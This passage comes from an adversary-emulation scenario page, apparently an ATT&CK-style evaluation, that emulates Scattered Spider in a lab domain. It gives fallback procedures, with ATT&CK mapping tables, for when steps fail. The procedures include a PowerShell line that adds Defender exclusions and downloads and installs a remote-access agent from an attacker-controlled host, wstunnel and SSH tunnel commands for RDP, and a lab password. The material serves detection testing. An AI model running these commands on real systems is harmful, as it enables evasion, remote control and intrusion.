+root        2373  1.5  1.3 1303984 111152 ?      Ssl  12:01   1:48 kube-controller-manager --allocate-node-cidrs=true --authentication-kubeconfig=/etc/kubernetes/controller-manager.conf --authorization-kubeconfig=/etc/kubernetes/controller-manager.conf --bind-address=127.0.0.1 --client-ca-file=/etc/kubernetes/pki/ca.crt --cluster-cidr=10.244.0.0/16 --cluster-name=airbyte-abctl --cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt --cluster-signing-key-file=/etc/kubernetes/pki/ca.key --controllers=*,bootstrapsigner,tokencleaner --enable-hostpath-provisioner=true --kubeconfig=/etc/kubernetes/controller-manager.conf --leader-elect=true --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --root-ca-file=/etc/kubernetes/pki/ca.crt --service-account-private-key-file=/etc/kubernetes/pki/sa.key --service-cluster-ip-range=10.96.0.0/16 --use-service-account-credentials=true
+root        2524  1.9  1.1 11222532 89820 ?      Ssl  12:01   2:21 etcd --advertise-client-urls=https://172.18.0.2:2379 --cert-file=/etc/kubernetes/pki/etcd/server.crt --client-cert-auth=true --data-dir=/var/lib/etcd --experimental-initial-corrupt-check=true --experimental-watch-progress-notify-interval=5s --initial-advertise-peer-urls=https://172.18.0.2:2380 --initial-cluster=airbyte-abctl-control-plane=https://172.18.0.2:2380 --key-file=/etc/kubernetes/pki/etcd/server.key --listen-client-urls=https://127.0.0.1:2379,https://172.18.0.2:2379 --listen-metrics-urls=http://127.0.0.1:2381 --listen-peer-urls=https://172.18.0.2:2380 --name=airbyte-abctl-control-plane --peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt --peer-client-cert-auth=true --peer-key-file=/etc/kubernetes/pki/etcd/peer.key --peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt --snapshot-count=10000 --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt
+root        3903  0.0  0.6 1282292 55500 ?       Ssl  12:01   0:01 /usr/local/bin/kube-proxy --config=/var/lib/kube-proxy/config.conf --hostname-override=airbyte-abctl-control-plane
+70          4292  0.0  0.0   1632   896 ?        Ss   12:01   0:00 /bin/sh /usr/local/bin/airbyte-entrypoint.sh
+70         12917  0.0  0.1 174704 14100 ?        Ss   13:02   0:00 postgres: airbyte temporal_visibility 10.244.0.8(36224) idle
+70         12919  0.0  0.2 174716 17792 ?        Ss   13:02   0:01 postgres: airbyte temporal 10.244.0.8(36238) idle
+...
+70         15883  0.0  0.1 174464 12820 ?        Ss   13:32   0:00 postgres: airbyte db-airbyte 10.244.0.12(50346) idle
+...
+tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      1457/docker-proxy</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-16">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-16">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Execution</td>
+<td>T1059.004</td>
+<td>Command and Scripting Interpreter: Unix Shell</td>
+<td>Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses the <code v-pre>ps</code> and <code v-pre>netstat</code> command-line utilities to verify the existence of AirByte processes</td>
+<td>rookery (10.212.3.107)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://blog.eclecticiq.com/ransomware-in-the-cloud-scattered-spider-targeting-insurance-and-financial-industries" class="outbound" target="_blank"><span>3</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1518</td>
+<td>Software Discovery</td>
+<td>Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses the <code v-pre>ps</code> and <code v-pre>netstat</code> command-line utilities to verify AirByte processes and login port</td>
+<td>rookery (10.212.3.107)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://blog.eclecticiq.com/ransomware-in-the-cloud-scattered-spider-targeting-insurance-and-financial-industries" class="outbound" target="_blank"><span>3</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-6---unable-to-access-systems-manager-or-run-command-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6---unable-to-access-systems-manager-or-run-command-fails">#</doc-anchor-trigger>
+        <span>Step 6 - Unable to access Systems Manager or Run Command fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-31">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-31">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If you are unable to access Systems Manager or Run Command fails, use the
+following alternative steps to continue execution.</p>
+<doc-anchor-target id="procedures-17">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-17">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the tab with the AWS Console Home. Search for &quot;Session Manager&quot;,
+and right-click to open &quot;Session Manager&quot; in a new tab. Then, click the &quot;Start
+session&quot; button. For <code v-pre>fleabottom</code>, <code v-pre>fishmonger</code>, <code v-pre>dragongate</code>, <code v-pre>sept</code>, and
+<code v-pre>citadel</code>, choose the option button to the left of the node and then click
+&quot;Start session&quot;. Once the session has started, run the following PowerShell
+command on that node. Once the command has completed, exit the session and
+repeat for the next node.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">mkdir &quot;C:\Program Files\TacticalAgent&quot; ; Add-MpPreference -ExclusionPath &quot;C:\Program Files\TacticalAgent&quot; ; Add-MpPreference -ExclusionPath &quot;C:\Program Files\Mesh Agent&quot; ; Add-MpPreference -ExclusionPath &quot;C:\ProgramData\TacticalRMM&quot; ; curl -o &quot;C:\Program Files\TacticalAgent\tacticalrmm.exe&quot; https://kingslanding-rmm.com/files/tactical.exe ; &amp; 'C:\Program Files\TacticalAgent\tacticalrmm.exe' -m install --api https://api.kingslanding-hr.com/ --client-id 1 --site-id 1 --agent-type workstation --auth addme --insecure</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-17">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-17">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Command and Control</td>
+<td>T1105</td>
+<td>Ingress Tool Transfer</td>
+<td>Windows, IaaS</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider downloads Tactical RMM on all available hosts</td>
+<td>redkeep (10.55.3.100), sept (10.55.3.101), dragongate (10.55.3.104), fleabottom (10.55.4.101), fishmonger (10.55.4.102)</td>
+<td>nt authority\system</td>
+<td><a href="../../resources/rmmagent/">TacticalRMM</a></td>
+<td>crowdstrike_analysis, <a href="https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/" class="outbound" target="_blank"><span>8</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1219</td>
+<td>Remote Access Software</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider installs Tactical RMM on all available hosts</td>
+<td>redkeep (10.55.3.100), sept (10.55.3.101), dragongate (10.55.3.104), fleabottom (10.55.4.101), fishmonger (10.55.4.102)</td>
+<td>nt authority\system</td>
+<td><a href="../../resources/rmmagent/">TacticalRMM</a></td>
+<td>crowdstrike_analysis, <a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-6---wstunnel-successful-but-tacticalrmm-fails-to-downloadinstallconnect">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6---wstunnel-successful-but-tacticalrmm-fails-to-downloadinstallconnect">#</doc-anchor-trigger>
+        <span>Step 6 - wstunnel successful but TacticalRMM fails to download/install/connect</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-32">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-32">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If wstunnel ran successfully but TacticalRMM fails to download/install/connect,
+use the following alternative step to continue execution.</p>
+<doc-anchor-target id="procedures-18">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-18">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the EC2 Serial Console connection to the newly created EC2
+instance. CTRL + C to kill the SSH tunnel created by the <code v-pre>wstunnel</code> client.
+Execute the <code v-pre>wstunnel</code> client with new arguments to establish an RDP tunnel to
+<code v-pre>fishmonger (10.55.4.102)</code></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">./wstunnel client -R tcp://12.78.0.94:2222:10.55.4.102:3389 wss://12.78.0.94:443</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the Jumpbox host <code v-pre>jumpbox (12.78.110.37)</code> and initiate an RDP
+session to <code v-pre>12.78.0.94:2222</code>. Depending on the point of failure for Tactical
+RMM, this may disconnect the legitimate RDP initiated from the jumpbox.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>12.78.0.94:2222</td>
+<td>atargaryen</td>
+<td>Graph-Frozen</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the main scenario using the RDP session in place of TacticalRMM.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-18">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-18">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Command and Control</td>
+<td>T1572</td>
+<td>Protocol Tunneling</td>
+<td>Windows, Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider executes wstunnel client on created EC2 instance to establish RDP tunnel to <code v-pre>fishmonger (10.55.4.102)</code></td>
+<td>fishmonger (10.55.4.102)</td>
+<td>kingslanding\ahightower</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1572</td>
+<td>Protocol Tunneling</td>
+<td>Windows, Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider connects to wstunnel and tunnels RDP through created EC2 instance to <code v-pre>fishmonger (10.55.4.102)</code></td>
+<td>fishmonger (10.55.4.102)</td>
+<td>ahightower</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Lateral Movement</td>
+<td>T1021.001</td>
+<td>Remote Services: Remote Desktop Protocol</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider accesses remote host fishmonger (10.55.4.102) using RDP</td>
+<td>fishmonger (10.55.4.102)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/" class="outbound" target="_blank"><span>8</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-6---wstunnel-and-tactical-rmm-fail">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6---wstunnel-and-tactical-rmm-fail">#</doc-anchor-trigger>
+        <span>Step 6 - wstunnel and Tactical RMM fail</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-33">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-33">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If both wstunnel and Tactical RMM fail, use the following alternative step to
+continue execution.</p>
+<doc-anchor-target id="procedures-19">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-19">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From the Jumpbox host <code v-pre>jumpbox (12.78.110.37)</code>, open Notepad, copy the SSH
+key from Step 4 from Kali into Notepad, and save it as <code v-pre>id_rsa</code> in the <code v-pre>.ssh</code>
+folder. Double check that it has an empty line at the bottom, and that the file
+saved without an extension. Then, open a new PowerShell window and execute an
+SSH tunnel through the created EC2 instance to <code v-pre>fishmonger (10.55.4.102)</code>,
+replacing <code v-pre>10.212.3.108</code> with the IP address of the created EC2 instance.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash">ssh -L 2222:10.55.4.102:3389 ubuntu@10.212.3.108</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> From the Jumpbox host <code v-pre>jumpbox (12.78.110.37)</code>, initiate an RDP session to
+<code v-pre>127.0.0.1:2222</code> supplying the domain admin&#x27;s credentials. Depending on the
+point of failure for Tactical RMM, this may disconnect the legitimate RDP
+initiated from the jumpbox.</p>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Destination</th>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>127.0.0.1:2222</td>
+<td>kingslanding\atargaryen</td>
+<td>Graph-Frozen</td>
+</tr>
+</tbody>
+</table>
+</div>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to the main scenario using the RDP session in place of TacticalRMM.</p>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-19">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-19">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Command and Control</td>
+<td>T1572</td>
+<td>Protocol Tunneling</td>
+<td>Windows, Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider uses SSH to tunnel RDP through the created EC2 instance to <code v-pre>fishmonger (10.55.4.102)</code></td>
+<td>fishmonger (10.55.4.102)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1572</td>
+<td>Protocol Tunneling</td>
+<td>Windows, Linux</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider connects to SSH tunnel and tunnels RDP through created EC2 instance to <code v-pre>fishmonger (10.55.4.102)</code></td>
+<td>fishmonger (10.55.4.102)</td>
+<td>atargaryen</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.microsoft.com/en-us/security/blog/2023/10/25/octo-tempest-crosses-boundaries-to-facilitate-extortion-encryption-and-destruction/" class="outbound" target="_blank"><span>6</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Lateral Movement</td>
+<td>T1021.001</td>
+<td>Remote Services: Remote Desktop Protocol</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider accesses remote host <code v-pre>fishmonger (10.55.4.102)</code> using RDP</td>
+<td>fishmonger (10.55.4.102)</td>
+<td>atargaryen</td>
+<td>-</td>
